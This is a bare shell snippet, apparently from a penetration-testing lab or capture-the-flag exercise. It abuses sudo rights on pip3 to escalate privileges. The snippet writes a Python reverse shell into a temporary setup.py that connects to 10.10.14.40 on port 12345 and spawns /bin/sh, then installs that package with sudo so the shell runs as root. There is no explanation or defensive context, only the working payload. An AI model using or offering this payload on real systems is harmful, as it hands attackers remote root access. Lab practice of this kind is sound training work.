TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect(("10.10.14.40",12345))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
sudo /usr/bin/pip3 install $TF
